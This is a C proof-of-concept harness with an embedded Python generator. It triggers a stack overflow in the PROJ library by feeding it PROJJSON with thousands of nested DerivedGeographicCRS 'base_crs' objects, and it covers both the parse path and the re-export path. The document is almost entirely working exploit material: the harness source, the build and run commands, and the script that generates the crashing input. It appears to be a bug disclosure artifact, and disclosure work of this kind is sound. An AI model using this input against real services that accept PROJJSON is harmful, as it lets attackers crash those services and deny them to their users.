/*
 * crs_SF01_poc.c - Stack Overflow via Deeply Nested DerivedCRS in PROJJSON
 *
 * Bug: DerivedCRS::_exportToJSON() at src/iso19111/crs.cpp:4234 calls
 *      baseCRS()->_exportToJSON() recursively without any depth limit.
 *      Similarly, the PROJJSON parser (JSONParser::create) recursively
 *      calls itself for nested "base_crs" objects without any depth limit.
 *
 * Both the PROJJSON parsing (proj_create) and re-export (proj_as_projjson)
 * paths are affected.
 *
 * Source: PROJ/src/iso19111/crs.cpp line 4234:
 *   void DerivedCRS::_exportToJSON(JSONFormatter *formatter) const {
 *     ...
 *     writer->AddObjKey("base_crs");
 *     baseCRS()->_exportToJSON(formatter);  // <-- recursive, no depth limit
 *     ...
 *   }
 *
 * Compile:
 *   clang++ -std=c++17 -fsanitize=address -g -O1 \
 *     -I/src/PROJ/include -I/src/PROJ/src \
 *     crs_SF01_poc.c \
 *     /proj4-build/lib/libproj.a \
 *     -lpthread /host-lib/libsqlite3.so.0 -ldl -lm \
 *     -o crs_SF01_poc
 *
 * Run (inside container):
 *   python3 gen_nested_projjson.py 5000 > /tmp/nested5000.json
 *   ulimit -s 1024
 *   ASAN_OPTIONS=detect_leaks=0 PROJ_DATA=/out/asan ./crs_SF01_poc /tmp/nested5000.json
 *
 * Generate the input with gen_nested_projjson.py (see comments at bottom)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern void *proj_context_create(void);
extern void proj_context_destroy(void *ctx);
extern void *proj_create(void *ctx, const char *definition);
extern void proj_destroy(void *obj);
extern const char *proj_as_projjson(void *ctx, const void *obj, const char *const *options);

static char *read_file(const char *path, size_t *len_out) {
    FILE *f = fopen(path, "rb");
    if (!f) { perror("fopen"); return NULL; }
    fseek(f, 0, SEEK_END);
    size_t len = ftell(f);
    rewind(f);
    char *buf = malloc(len + 1);
    if (!buf) { fclose(f); return NULL; }
    fread(buf, 1, len, f);
    buf[len] = '\0';
    fclose(f);
    if (len_out) *len_out = len;
    return buf;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <nested_projjson_file>\n", argv[0]);
        fprintf(stderr, "Generate input: python3 gen_nested_projjson.py 5000 > input.json\n");
        return 1;
    }

    size_t len = 0;
    char *json_str = read_file(argv[1], &len);
    if (!json_str) return 1;

    printf("JSON length: %zu bytes\n", len);

    void *ctx = proj_context_create();

    /* Path 1: Stack overflow during PROJJSON parsing (JSONParser::create recurse) */
    printf("Testing proj_create from deeply nested PROJJSON...\n");
    fflush(stdout);
    void *obj = proj_create(ctx, json_str);

    if (obj) {
        printf("Object created OK.\n");
        /* Path 2: Stack overflow during PROJJSON re-export (DerivedCRS::_exportToJSON) */
        printf("Testing proj_as_projjson re-export...\n");
        fflush(stdout);
        const char *out = proj_as_projjson(ctx, obj, NULL);
        if (out) {
            printf("JSON export OK, length=%zu\n", strlen(out));
        } else {
            printf("proj_as_projjson returned null\n");
        }
        proj_destroy(obj);
    } else {
        printf("proj_create returned null (possible crash below this)\n");
    }

    proj_context_destroy(ctx);
    free(json_str);
    printf("Done.\n");
    return 0;
}

/*
 * Generate the PROJJSON input with this Python script (gen_nested_projjson.py):
 *
 * import sys
 * depth = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
 *
 * base_cs = ('"coordinate_system":{"subtype":"ellipsoidal","axis":['
 *            '{"name":"Geodetic latitude","abbreviation":"Lat","direction":"north","unit":"degree"},'
 *            '{"name":"Geodetic longitude","abbreviation":"Lon","direction":"east","unit":"degree"}]}')
 * base = ('{"$schema":"https://proj.org/schemas/v0.7/projjson.schema.json",'
 *          '"type":"GeographicCRS","name":"WGS 84",'
 *          '"datum":{"type":"GeodeticReferenceFrame","name":"World Geodetic System 1984",'
 *          '"ellipsoid":{"name":"WGS 84","semi_major_axis":6378137,"inverse_flattening":298.257223563}},'
 *          + base_cs + '}')
 * conv = '"conversion":{"name":"pole_rotation","method":{"name":"PROJ ob_tran o_proj=latlong o_lon_p=0 o_lat_p=90"},"parameters":[]}'
 * current = base
 * for i in range(1, depth + 1):
 *     current = ('{"type":"DerivedGeographicCRS","name":"level_' + str(i) + '",'
 *                '"base_crs":' + current + ',' + conv + ',' + base_cs + '}')
 * sys.stdout.write(current + '\n')
 */
